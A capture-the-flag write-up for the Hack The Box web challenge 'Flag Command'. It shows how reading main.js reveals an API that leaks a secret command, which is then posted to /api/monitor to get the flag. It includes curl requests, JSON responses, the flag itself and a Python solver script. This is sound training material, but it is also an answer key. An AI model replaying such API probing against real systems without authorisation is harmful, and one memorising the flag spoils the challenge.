# HTB WEB - Flag Command

After landing on the page the first thing to do is to enumerate the site, since some JS files are given to run the game those are a good place to start. Looking at `main.js` it appears there is an api which lists the current commands.

``` js
const fetchOptions = () => {
    fetch('/api/options')
        .then((data) => data.json())
        .then((res) => {
            availableOptions = res.allPossibleCommands;

        })
        .catch(() => {
            availableOptions = undefined;
        })
}
```

Calling that function we get a json of the available commands

``` bash
$ curl http://94.237.59.199:32475/api/options

{
  "allPossibleCommands": {
    "1": [
      "HEAD NORTH",
      "HEAD WEST",
      "HEAD EAST",
      "HEAD SOUTH"
    ],
    "2": [
      "GO DEEPER INTO THE FOREST",
      "FOLLOW A MYSTERIOUS PATH",
      "CLIMB A TREE",
      "TURN BACK"
    ],
    "3": [
      "EXPLORE A CAVE",
      "CROSS A RICKETY BRIDGE",
      "FOLLOW A GLOWING BUTTERFLY",
      "SET UP CAMP"
    ],
    "4": [
      "ENTER A MAGICAL PORTAL",
      "SWIM ACROSS A MYSTERIOUS LAKE",
      "FOLLOW A SINGING SQUIRREL",
      "BUILD A RAFT AND SAIL DOWNSTREAM"
    ],
    "secret": [
      "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
    ]
  }
}
```

The key `secret` seems pretty important, and it looks like the command for the secret is pretty long. We will need to figure out how to give the application a command. Looking through `main.js` again, we see the function `CheckMessage`

``` js
async function CheckMessage() {
    fetchingResponse = true;
    currentCommand = commandHistory[commandHistory.length - 1];

    if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
        await fetch('/api/monitor', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 'command': currentCommand })
        })
...
```

It looks like sending a POST request with the command embedded will do the trick.

``` bash
	$ curl -X POST http://94.237.59.199:32475/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'

{
  "message": "HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}"
}
```

With this we get the flag: HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}


Script:

``` python
import requests
import json

HOST = '94.237.59.199'
PORT = 32475
URL = f'http://{HOST}:{PORT}'
 
# Grab the secret command 
resp = requests.get(f'{URL}/api/options')
options = json.loads(resp.text)
secret_cmd = options['allPossibleCommands']['secret'][0]

# Pass in the secret command to get the flag 
resp = requests.post(f'{URL}/api/monitor', json={'command': secret_cmd})
flag = json.loads(resp.text)['message']
print(flag)
```